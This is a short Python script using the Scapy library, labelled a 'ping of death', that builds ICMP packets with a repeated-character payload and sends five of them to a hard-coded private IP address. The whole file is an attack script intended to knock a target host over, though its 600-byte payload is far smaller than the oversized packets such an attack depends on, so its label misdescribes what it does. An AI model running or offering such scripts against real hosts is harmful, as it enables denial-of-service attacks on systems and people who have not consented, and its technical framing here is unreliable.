from scapy.all import *
# Change according with your IP addresses
#SOURCE_IP="10.0.0.65"
TARGET_IP="10.0.0.87"
MESSAGE="T"
NUMBER_PACKETS=5 # Number of pings
pingOFDeath = IP(dst=TARGET_IP)/ICMP()/(MESSAGE*600)
send(NUMBER_PACKETS*pingOFDeath)
